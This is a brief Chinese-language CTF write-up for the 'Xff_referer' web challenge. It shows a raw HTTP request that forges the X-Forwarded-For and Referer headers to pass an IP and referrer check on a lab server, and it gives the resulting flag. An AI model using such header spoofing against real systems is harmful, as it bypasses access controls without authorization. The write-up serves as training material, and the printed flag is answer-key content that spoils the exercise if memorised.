# Xff_referer

> 按照提示,伪造X-Forwarded-For和Referer这二个字段

## 思路分析

> 按照提示,伪造X-Forwarded-For和Referer这二个字段

## payload

```
GET / HTTP/1.1
Host: 61.147.171.105:58986
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Referer:https://www.google.com
X-Forwarded-For:123.123.123.123
```

## flag

> cyberpeace{259e6ed318d72520a084b5a78d029bb2}